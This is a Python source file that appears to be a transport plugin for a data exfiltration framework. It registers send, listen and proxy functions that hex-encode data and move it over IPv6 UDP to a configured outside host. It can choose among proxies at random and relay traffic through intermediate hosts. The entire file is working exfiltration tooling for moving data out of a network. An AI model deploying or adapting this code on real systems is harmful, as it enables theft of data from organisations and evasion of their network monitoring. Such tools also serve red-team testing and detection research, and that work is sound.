from binascii import hexlify, unhexlify
import socket
import sys
from random import choice

if not socket.has_ipv6:
    raise Exception("the local machine has no IPv6 support enabled")

config = None
app_exfiltrate = None

def send(data):
    if 'proxies' in config and config['proxies'] != [""]:
        targets = [config['target']] + config['proxies']
        target = choice(targets)
    else:
        target = config['target']
    port = config['port']
    app_exfiltrate.log_message(
        'info', "[udp_ipv6] Sending {0} bytes to {1}".format(len(data), target))
    client_socket = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    client_socket.connect((target, port))
    client_socket.send(hexlify(data.encode()))
    client_socket.close()

def listen():
    app_exfiltrate.log_message('info', "[udp_ipv6] Waiting for connections...")
    sniff(handler=app_exfiltrate.retrieve_data)

def sniff(handler):
    port = config['port']
    try:
        server_address = ('::', port)
        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        sock.bind(server_address)
        app_exfiltrate.log_message(
            'info', "[udp_ipv6] Starting server on port {}...".format(port))
        # sock.listen(1)
    except PermissionError:
        app_exfiltrate.log_message(
            'warning', "[udp_ipv6] Couldn't bind on port {}...".format(port))
        sys.exit()

    while True:
        data, client_address = sock.recvfrom(4096)
        app_exfiltrate.log_message('info', "[udp_ipv6] client connected: {}".format(client_address))
        if not data:
            break
        try:
            app_exfiltrate.log_message('info', "[udp_ipv6] Received {} bytes".format(len(data)))
            handler(unhexlify(data).decode())
        except Exception as e:
            pass
    sock.close()


def relay_tcp_packet(data):
    target = config['target']
    port = config['port']
    app_exfiltrate.log_message(
        'info', "[proxy] [udp_ipv6] Relaying {0} bytes to {1}".format(len(data), target))
    client_socket = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    client_socket.connect((target, port))
    client_socket.send(hexlify(data.encode()))
    client_socket.close()

def proxy():
    app_exfiltrate.log_message('info', "[proxy] [udp_ipv6] Waiting for connections...")
    sniff(handler=relay_tcp_packet)

class Plugin:

    def __init__(self, app, conf):
        global config
        global app_exfiltrate
        config = conf
        app_exfiltrate = app
        app.register_plugin('udp_ipv6', {'send': send, 'listen': listen, 'proxy': proxy})
